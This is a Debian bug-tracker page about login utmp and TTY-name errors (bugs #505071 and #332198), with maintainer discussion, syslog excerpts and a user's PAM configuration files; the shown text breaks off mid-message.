Date: Sun, 26 Apr 2009 19:13:00 +0200
```
Hello,

On Wed, Apr 22, 2009 at 10:41:21AM +1000, psz@maths.usyd.edu.au wrote:
>
> Had a quick look at src/login.c and libmisc/utmp.c, and see the "plain"
> (not security) issues below. - The enspent() block should be moved up
> in newgrp.c also.

Thanks for checking this.
They should be fixed now.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Sun, 26 Apr 2009 20:54:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=208), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=208), [link](#207)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Sun, 26 Apr 2009 20:54:03 GMT) ([full text](bugreport.cgi?bug=505071;msg=210), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=210), [link](#209)).

---

[Message #211](#211) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=211), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=211), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Mon, 27 Apr 2009 06:51:11 +1000
```
Dear Nicolas,

>> But mainly, "exec login" cannot possibly work in a PAM environment, but
>> will fail/die and "lose" the user session; users should not be tricked
>> into doing that. Presumably the user logged in with login (e.g. telnet,
>> may not apply for ssh or xterm); then login done a fork before running
>> the shell; any utmp entry refers to the PID of the parent login.
>
> I don't get your point.
> At least when login was setuid on debian, "exec login" used to work on PAM
> environments.

Please do the simple test (which "works" regardless whether login is
setuid or not):

anyone@anywhere:~$ /usr/bin/telnet bari
Trying 129.78.69.145...
Connected to bari.maths.usyd.edu.au.
Escape character is '^]'.
Debian GNU/Linux 4.0
bari.maths.usyd.edu.au login: psz
Password:
...
psz@bari:~$ /bin/login
No utmp entry.  You must exec "login" from the lowest level "sh"
psz@bari:~$ exec /bin/login
No utmp entry.  You must exec "login" from the lowest level "sh"
Connection closed by foreign host.
anyone@anywhere:~$

Surely your memory of "used to work" is wrong?

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 27 Apr 2009 00:06:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=213), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=213), [link](#212)).

---

**Acknowledgement sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 27 Apr 2009 00:06:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=215), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=215), [link](#214)).

---

[Message #216](#216) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=216), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=216), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: psz@maths.usyd.edu.au
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow
1:4.1.3-1
Date: Mon, 27 Apr 2009 02:03:48 +0200
```
On Mon, Apr 27, 2009 at 06:51:11AM +1000, psz@maths.usyd.edu.au wrote:
> Dear Nicolas,
>
> >> But mainly, "exec login" cannot possibly work in a PAM environment, but
> >> will fail/die and "lose" the user session; users should not be tricked
> >> into doing that. Presumably the user logged in with login (e.g. telnet,
> >> may not apply for ssh or xterm); then login done a fork before running
> >> the shell; any utmp entry refers to the PID of the parent login.
> >
> > I don't get your point.
> > At least when login was setuid on debian, "exec login" used to work on PAM
> > environments.
>
> Please do the simple test (which "works" regardless whether login is
> setuid or not):
>
> anyone@anywhere:~$ /usr/bin/telnet bari
[...]
>
> Surely your memory of "used to work" is wrong?

It works when you use a tool which sets UTMP before it provides the shell.
telnetd does not, but for example xterm does.

Best Regards,
--
Nekral

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 27 Apr 2009 00:27:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=218), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=218), [link](#217)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 27 Apr 2009 00:27:04 GMT) ([full text](bugreport.cgi?bug=505071;msg=220), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=220), [link](#219)).

---

[Message #221](#221) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=221), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=221), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: nicolas.francois@centraliens.net
Cc: 505071@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Mon, 27 Apr 2009 10:25:58 +1000
```
Dear Nicolas,

> It works when you use a tool which sets UTMP before it provides the shell.
> telnetd does not, but for example xterm does.

More to the point: login does not. To belabour the point: if you "come"
from login (e.g. via telnet), then login provides a utmp entry, but that
refers to the PID of login which is the parent of your shell; using
"exec login" does not "see" that (correctly set) utmp entry.

I checked and "exec login" does not work from an ssh login either.
Yes, I know it would work from an xterm.

In other words: your favourite tool is (should be) login; it does
provide an utmp entry, but not in a way that it can use it itself.
We could say that login is self-contradictory, inconsistent.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Information forwarded**
to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#505071`; Package `login`.
(Mon, 27 Apr 2009 02:48:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=223), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=223), [link](#222)).

---

**Acknowledgement sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
(Mon, 27 Apr 2009 02:48:02 GMT) ([full text](bugreport.cgi?bug=505071;msg=225), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=225), [link](#224)).

---

[Message #226](#226) received at 505071@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=226), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=226), reply):

![](/cgi-bin/libravatar.cgi?email=psz%40maths.usyd.edu.au)
From: Paul Szabo <psz@maths.usyd.edu.au>
To: 505071@bugs.debian.org, nicolas.francois@centraliens.net
Subject: Re: Bug#505071: closed ... fixed in shadow 1:4.1.3-1
Date: Mon, 27 Apr 2009 12:40:48 +1000
```
Dear Nicolas,

> They should be fixed now.

Thanks, things seem OK now.

Cheers, Paul

Paul Szabo   psz@maths.usyd.edu.au   <http://www.maths.usyd.edu.au/u/psz/>
School of Mathematics and Statistics   University of Sydney    Australia

```

---

**Reply sent**
to `Nicolas François <nicolas.francois@centraliens.net>`:

You have taken responsibility.
(Sat, 18 Jul 2009 17:06:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=228), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=228), [link](#227)).

---

**Notification sent**
to `Paul Szabo <psz@maths.usyd.edu.au>`:

Bug acknowledged by developer.
(Sat, 18 Jul 2009 17:06:06 GMT) ([full text](bugreport.cgi?bug=505071;msg=230), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=230), [link](#229)).

---

[Message #231](#231) received at 505071-done@bugs.debian.org ([full text](bugreport.cgi?bug=505071;msg=231), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=231), reply):

![](/cgi-bin/libravatar.cgi?email=nicolas.francois%40centraliens.net)
From: Nicolas François <nicolas.francois@centraliens.net>
To: 505071-done@bugs.debian.org
Subject: Re: Bug#505071: login tty mis-determination (see bug#332198)
Date: Sat, 18 Jul 2009 19:03:35 +0200
```
Version: 1:4.1.4.1-1

On Mon, Apr 27, 2009 at 12:40:48PM +1000, Paul Szabo wrote:
>
> > They should be fixed now.
>
> Thanks, things seem OK now.

Paul, I'm closing now.
This seems to be fixed.
There were other topics raised in this bug. I also think they were dealt
with.

Reading the backlog (last mail "Mon, 27 Apr 2009 10:25:58 +1000"),
login should also be fixed regarding the last issue as it reports to UTMP
the right PID.

Best Regards,
--
Nekral

```

---

**Bug archived.**
Request was from `Debbugs Internal Request <owner@bugs.debian.org>`
to `internal_control@bugs.debian.org`.
(Sun, 16 Aug 2009 07:35:32 GMT) ([full text](bugreport.cgi?bug=505071;msg=233), [mbox](bugreport.cgi?bug=505071;mbox=yes;msg=233), [link](#232)).

---

Send a report that [this bug log contains spam](https://bugs.debian.org/cgi-bin/bugspam.cgi?bug=505071).

---

Debian bug tracking system administrator <owner@bugs.debian.org>.
Last modified:
Sat Jan 25 15:17:54 2025;
Machine Name:
buxtehude

[Debian Bug tracking system](https://www.debian.org/Bugs/)

Debbugs is free software and licensed under the terms of the GNU General
Public License version 2. The current version can be obtained
from <https://bugs.debian.org/debbugs-source/>.

Copyright © 1999 Darren O. Benham,
1997,2003 nCipher Corporation Ltd,
1994-97 Ian Jackson,
2005-2017 Don Armstrong, and many other contributors.



=== Content from bugs.debian.org_9117899f_20250125_151752.html ===

# Debian Bug report logs - #332198 login: unable to determine TTY name, got /dev/pts/1

[![version graph](version.cgi?found=login%2F1%3A4.0.3-35;package=login;height=2;absolute=0;width=2;collapse=1)](version.cgi?absolute=0;info=1;package=login;found=login%2F1%3A4.0.3-35;collapse=1)

Package:
[login](pkgreport.cgi?package=login);
Maintainer for [login](pkgreport.cgi?package=login) is [util-linux packagers <util-linux@packages.debian.org>](pkgreport.cgi?maint=util-linux%40packages.debian.org); Source for [login](pkgreport.cgi?package=login) is [src:util-linux](pkgreport.cgi?src=util-linux) ([PTS](https://tracker.debian.org/pkg/util-linux), [buildd](https://buildd.debian.org/util-linux), [popcon](https://qa.debian.org/popcon.php?package=util-linux)).

Reported by: [Marc Lehmann <debian-reportbug@plan9.de>](pkgreport.cgi?submitter=debian-reportbug%40plan9.de)

Date: Wed, 5 Oct 2005 04:33:02 UTC

Owned by: [Alexander Gattin <arg@online.com.ua>](pkgreport.cgi?owner=arg%40online.com.ua)

Severity: normal

Tags: moreinfo

Found in version login/1:4.0.3-35

**Done:** Christian Perrier <bubulle@debian.org>

Bug is archived. No further changes may be made.

Display info messages

View this report as an [mbox folder](bugreport.cgi?bug=332198;mbox=yes), [status mbox](bugreport.cgi?bug=332198;mbox=yes;mboxstatus=yes), [maintainer mbox](bugreport.cgi?bug=332198;mbox=yes;mboxmaint=yes)

---

**Report forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=2), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=2), [link](#1)).

---

**Acknowledgement sent** to `Marc Lehmann <debian-reportbug@plan9.de>`:

New Bug report received and forwarded. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=4), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=4), [link](#3)).

---

[Message #5](#5) received at submit@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=5), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=5), reply):

![](/cgi-bin/libravatar.cgi?email=debian-reportbug%40plan9.de)
From: Marc Lehmann <debian-reportbug@plan9.de>
To: Debian Bug Tracking System <submit@bugs.debian.org>
Subject: login: unable to determine TTY name, got /dev/pts/1
Date: Wed, 05 Oct 2005 06:23:15 +0200
```
Package: login
Version: 1:4.0.3-35
Severity: normal

Directly after a fresh reboot eeboot, "rsh rebooted-host" results in an
immediate connection close, and the syslog on the remote host says:

   Oct  5 06:12:36 cerebro in.rlogind: Connection from root@fuji for root
   Oct  5 06:12:36 cerebro pam_rhosts_auth[452]: allowed to root@fuji as root
   Oct  5 06:12:36 cerebro login[453]: (pam_unix) session opened for user root by root(uid=0)
 > Oct  5 06:12:36 cerebro login[453]: unable to determine TTY name, got /dev/pts/1
   Oct  5 06:12:36 cerebro in.rlogind[452]: Closing connection with root@fuji

"/dev/pts/1" looks like a perfectly fine tty name to me. Subsequent rsh
calls work fine.

I think at least the error message should be clearer, right now it is
wrong, as it did correctly determine the tty name, and something else
failed.

-- System Information:
Debian Release: testing/unstable
  APT prefers testing
  APT policy: (700, 'testing'), (500, 'unstable'), (500, 'stable'), (1, 'experimental')
Architecture: i386 (i686)
Shell:  /bin/sh linked to /bin/dash
Kernel: Linux 2.6.12.3
Locale: LANG=C, LC_CTYPE=de_DE.UTF-8 (charmap=UTF-8)

Versions of packages login depends on:
hi  libc6                         2.3.5-6    GNU C Library: Shared libraries an
ii  libpam-modules                0.76-23    Pluggable Authentication Modules f
ii  libpam-runtime                0.76-23    Runtime support for the PAM librar
ii  libpam0g                      0.76-23    Pluggable Authentication Modules l

login recommends no packages.

-- no debconf information

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=7), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=7), [link](#6)).

---

**Acknowledgement sent** to `Christian Perrier <bubulle@debian.org>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=9), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=9), [link](#8)).

---

[Message #10](#10) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=10), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=10), reply):

![](/cgi-bin/libravatar.cgi?email=bubulle%40debian.org)
From: Christian Perrier <bubulle@debian.org>
To: Marc Lehmann <debian-reportbug@plan9.de>, 332198@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#332198: login: unable to determine TTY name, got /dev/pts/1
Date: Wed, 5 Oct 2005 18:13:58 +0200
```
Quoting Marc Lehmann (debian-reportbug@plan9.de):
> Package: login
> Version: 1:4.0.3-35
> Severity: normal
>
>
> Directly after a fresh reboot eeboot, "rsh rebooted-host" results in an
> immediate connection close, and the syslog on the remote host says:
>
>    Oct  5 06:12:36 cerebro in.rlogind: Connection from root@fuji for root
>    Oct  5 06:12:36 cerebro pam_rhosts_auth[452]: allowed to root@fuji as root
>    Oct  5 06:12:36 cerebro login[453]: (pam_unix) session opened for user root by root(uid=0)
>  > Oct  5 06:12:36 cerebro login[453]: unable to determine TTY name, got /dev/pts/1
>    Oct  5 06:12:36 cerebro in.rlogind[452]: Closing connection with root@fuji
>
> "/dev/pts/1" looks like a perfectly fine tty name to me. Subsequent rsh
> calls work fine.
>
> I think at least the error message should be clearer, right now it is
> wrong, as it did correctly determine the tty name, and something else

Can you try reproducing this with login and passwd packages from sid ?

Etch (testing) currently still has the old 4.0.3 version we had in
sarge and the gap with 4.0.12 which is in sid is huge.

It also seems that you're trying to rsh from root to root on another
host.

Despite being highly insecure, have you checked the contents of
/etc/securetty on the target machine?

I actually think that the "unable to determine TTY name" from login is
maybe not *the* cause of the problem.

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=12), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=12), [link](#11)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=14), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=14), [link](#13)).

---

[Message #15](#15) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=15), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=15), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org
Cc: Marc Lehmann <debian-reportbug@plan9.de>, control@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: login: unable to determine TTY name, got /dev/pts/1
Date: Thu, 6 Oct 2005 01:58:05 +0300
```
tags 332198 moreinfo
thanks

What are versions of dash, rsh-client and rsh-server
used?

On Wed, Oct 05, 2005 at 06:13:58PM +0200, Christian Perrier wrote:
> Quoting Marc Lehmann (debian-reportbug@plan9.de):
> > Version: 1:4.0.3-35
> >
> >
> > Directly after a fresh reboot eeboot, "rsh rebooted-host" results in an
> > immediate connection close, and the syslog on the remote host says:
> >
> >    Oct  5 06:12:36 cerebro in.rlogind: Connection from root@fuji for root
> >    Oct  5 06:12:36 cerebro pam_rhosts_auth[452]: allowed to root@fuji as root
> >    Oct  5 06:12:36 cerebro login[453]: (pam_unix) session opened for user root by root(uid=0)
> >  > Oct  5 06:12:36 cerebro login[453]: unable to determine TTY name, got /dev/pts/1
> >    Oct  5 06:12:36 cerebro in.rlogind[452]: Closing connection with root@fuji
> >
> > "/dev/pts/1" looks like a perfectly fine tty name to me. Subsequent rsh
> > calls work fine.
> >
> > I think at least the error message should be clearer, right now it is
> > wrong, as it did correctly determine the tty name, and something else
>
> Can you try reproducing this with login and passwd packages from sid ?

I tried with new login, rlogin-ed OK on pts/0 and pts/1...
// sh -> bash on my system BTW

> I actually think that the "unable to determine TTY name" from login is
> maybe not *the* cause of the problem.

But after RTFS, I think this error msg is really
misleading...

--
WBR,
xrgtn

```

---

**Tags added: moreinfo**
Request was from `Alexander Gattin <xrgtn@yandex.ru>`
to `control@bugs.debian.org`.
([full text](bugreport.cgi?bug=332198;msg=17), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=17), [link](#16)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=19), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=19), [link](#18)).

---

**Acknowledgement sent** to `Alexander Gattin <xrgtn@yandex.ru>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=21), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=21), [link](#20)).

---

[Message #22](#22) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=22), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=22), reply):

![](/cgi-bin/libravatar.cgi?email=xrgtn%40yandex.ru)
From: Alexander Gattin <xrgtn@yandex.ru>
To: 332198@bugs.debian.org
Cc: Marc Lehmann <debian-reportbug@plan9.de>,
332198-submitter@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] login: unable to determine TTY name, got /dev/pts/1
Date: Thu, 6 Oct 2005 22:00:59 +0300
```
Hi!

> What are versions of dash, rsh-client and rsh-server
> used?

Do you use rsh-redone-server or rsh-server?
Do you use rsh-redone-client or rsh-client?
What is in your /etc/pam.d/rsh? /etc/pam.d/rlogin?

> > >    Oct  5 06:12:36 cerebro in.rlogind: Connection from root@fuji for root

Well, I don't have such lines from in.rlogind in
my auth.log (I try on localhost)...

> > > "/dev/pts/1" looks like a perfectly fine tty name to me. Subsequent rsh
> > > calls work fine.

Subsequent rsh calls _on /dev/pts/1_?

> > Can you try reproducing this with login and passwd packages from sid ?
>
> I tried with new login, rlogin-ed OK on pts/0 and pts/1...
> // sh -> bash on my system BTW

I tried with login 1:4.0.3-35 and /bin/sh symlinked to
dash -- the same effect, i.e. everything works...

Marc, could you shed more light on your configuration,
please?

--
WBR,
xrgtn

```

---

**Message sent on** to `Marc Lehmann <debian-reportbug@plan9.de>`:

Bug#332198.
([full text](bugreport.cgi?bug=332198;msg=24), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=24), [link](#23)).

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=27), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=27), [link](#26)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=29), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=29), [link](#28)).

---

[Message #30](#30) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=30), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=30), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Christian Perrier <bubulle@debian.org>
Cc: 332198@bugs.debian.org
Subject: Re: [Pkg-shadow-devel] Bug#332198: login: unable to determine TTY name, got /dev/pts/1
Date: Fri, 7 Oct 2005 07:30:12 +0200
```
On Wed, Oct 05, 2005 at 06:13:58PM +0200, Christian Perrier <bubulle@debian.org> wrote:
> Can you try reproducing this with login and passwd packages from sid ?

It happens with this version, too:

ii  login                              4.0.11.1-1 system login tools
ii  passwd                             4.0.11.1-1 change and administer password and group data

If you want, I can test with 4.0.12 if there are important changes between
4.0.11 and .12.

> It also seems that you're trying to rsh from root to root on another
> host.

Yes.

> Despite being highly insecure,

Despite this being untrue and not substantiatable, people like to repeat
this kind of non-fact often, just like parrots :) What might be insecure
is not rsh, but, say, your root-password, or your wire, or ..., but
rsh/rlogin are not generally less secure than, say, ssh. Claiming it is
does not improve security, because it only makes issues more confusing.

If you meant that seriously, you should first understand what the
insecurities are that are involved in remote login are, and it's not the
rlogin protocol. At least ssh is not generally more secure (it supports
the same modes of authentication, and not every wire can be tapped, nor
does tapping, in generally, lower the security of rsh/rlogin), and people
don't complain about ssh being "highly insecure", either.

> have you checked the contents of
> /etc/securetty on the target machine?

It does not contain any pts/* entries, but that doesn't matter, because my
pam.d/rlogin file looks like this (should have attached it to the original
report, sorry), and has securetty checks disabled:

   #%PAM-1.0
   #auth           requisite       pam_securetty.so
   auth            sufficient      pam_rhosts_auth.so suppress no_hosts_equiv
   auth            required        pam_unix.so nullok
   auth            required        pam_nologin.so
   account         required        pam_unix.so
   password        required        pam_unix.so nullok use_authtok obscure min=4 max=8
   session         required        pam_unix.so

> I actually think that the "unable to determine TTY name" from login is
> maybe not *the* cause of the problem.

That might very well be. I do not see that message, however, when it works
(probably >>99.999% of the time), and I have the syslog from my machines
onscreen most of the time, so it is at least a hint on the problem, even if
it's just another symptom.

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=32), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=32), [link](#31)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=34), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=34), [link](#33)).

---

[Message #35](#35) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=35), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=35), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Alexander Gattin <xrgtn@yandex.ru>
Cc: 332198@bugs.debian.org, control@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] Bug#332198: login: unable to determine TTY name, got /dev/pts/1
Date: Fri, 7 Oct 2005 07:38:42 +0200
```
On Thu, Oct 06, 2005 at 01:58:05AM +0300, Alexander Gattin <xrgtn@yandex.ru> wrote:
> What are versions of dash, rsh-client and rsh-server
> used?

One both machines:

ii  dash                               0.5.2-5                            The Debian Almquist Shell
ii  rsh-redone-server                  66-1                               Reimplementation of rshd and rlogind
ii  rsh-client                         0.17-13                            rsh clients.

It happens in either direction.

I am myself a bit surprised that those two are still using
rsh-redone-server (both rsh-redone-server and -client caused me much
grieve on my production machines), and I'll switch to the standard
rsh-server and rsh-client packages (the machines with the problem are my
desktop machine and laptop, where I log in remotely less often).

I also installed 1:4.0.12-6 versions of both passwd and login on both
machines, and will have a look on the problem (it is hard to reproduce,
though, as it only happens one every few weeks or so, at daily reboots).

> > Can you try reproducing this with login and passwd packages from sid ?
>
> I tried with new login, rlogin-ed OK on pts/0 and pts/1...
> // sh -> bash on my system BTW

dash here, as you already knew :)

--
                The choice of a
      -----==-     _GNU_
      ----==-- _       generation     Marc Lehmann
      ---==---(_)__  __ ____  __      pcg@goof.com
      --==---/ / _ \/ // /\ \/ /      <http://schmorp.de/>
      -=====/_/_//_/\_,_/ /_/\_\      XX11-RIPE

```

---

**Information forwarded** to `debian-bugs-dist@lists.debian.org, Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`:

`Bug#332198`; Package `login`.
([full text](bugreport.cgi?bug=332198;msg=37), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=37), [link](#36)).

---

**Acknowledgement sent** to `Marc Lehmann <schmorp@schmorp.de>`:

Extra info received and forwarded to list. Copy sent to `Shadow package maintainers <pkg-shadow-devel@lists.alioth.debian.org>`.
([full text](bugreport.cgi?bug=332198;msg=39), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=39), [link](#38)).

---

[Message #40](#40) received at 332198@bugs.debian.org ([full text](bugreport.cgi?bug=332198;msg=40), [mbox](bugreport.cgi?bug=332198;mbox=yes;msg=40), reply):

![](/cgi-bin/libravatar.cgi?email=schmorp%40schmorp.de)
From: Marc Lehmann <schmorp@schmorp.de>
To: Alexander Gattin <xrgtn@yandex.ru>
Cc: 332198@bugs.debian.org, 332198-submitter@bugs.debian.org
Subject: Re: Bug#332198: [Pkg-shadow-devel] login: unable to determine TTY name, got /dev/pts/1
Date: Fri, 7 Oct 2005 07:53:05 +0200
```
On Thu, Oct 06, 2005 at 10:00:59PM +0300, Alexander Gattin <xrgtn@yandex.ru> wrote:
> > What are versions of dash, rsh-client and rsh-server
> > used?
>
> Do you use rsh-redone-server or rsh-server?
> Do you use rsh-redone-client or rsh-client?
> What is in your /etc/pam.d/rsh? /etc/pam.d/rlogin?

My original report is somewhat confusing, I see now, as I only tested
rlogin (rsh without a command), so rsh should not matter, here is
pam.d/rsh:

   #
   # The PAM configuration file for the rsh (Remote Shell) service
   #
   # Due to limitations in the rsh protocol, modules depending on the conversation
   # function to work cannot be used.  This includes authentication modules such
   # as pam_unix.so.

   auth    required        pam_rhosts_auth.so  suppress no_hosts_equiv
   auth    required        pam_nologin.so
   auth    required        pam_env.so
   account required        pam_unix_acct.so
   session required        pam_limits.so
   session required        pam_unix_session.so

And here is pam.d/rlogin (as given earlier):

   #%PAM-1.0
   #auth           requisite       pam_securetty.so
   auth            sufficient      pam_rhosts_auth.so suppress no_hosts_equiv
   auth            required        pam_unix.so nullok
   auth            required        pam_nologin.so
   account         required        pam_unix.so
   password        required        pam_unix.so nullok use_authtok obscure min=4 max=8
   session         required        pam_unix.so

If it matters, I also use .rhosts-based authentication.

> > > >    Oct  5 06:12:36 cerebro in.rlogind: Connection from root@fuji for root
>
> Well, I don't have such lines from in.rlogind in
> my auth.log (I try on localhost)...

That was due to rsh-redone-server (sorry again, I was convinced I had it
replaced everywhere). With rsh-server, it looks like this:

   Oct  7 07:43:26 cerebro pam_rhosts_auth[25505]: allowed to root@fuji as root
   Oct  7 07:43:26 cerebro login[25506]: (pam_unix) session opened for user root by (uid=0)
   Oct  7 07:43:26 cerebro login[25507]: ROOT LOGIN  on `pts/7' from `fuji'

> > > > "/dev/pts/1" looks like a perfectly fine tty name to me. Subsequent rsh
> > > > calls work fine.
>
> Subsequent rsh calls _on /dev/pts/1_?

Can't say, but very likely uses a different tty name. I also grepped through
my logs:

   Oct  5 06:12:36 cerebro login[453]: unable to determine TTY name, got /dev/pts/1
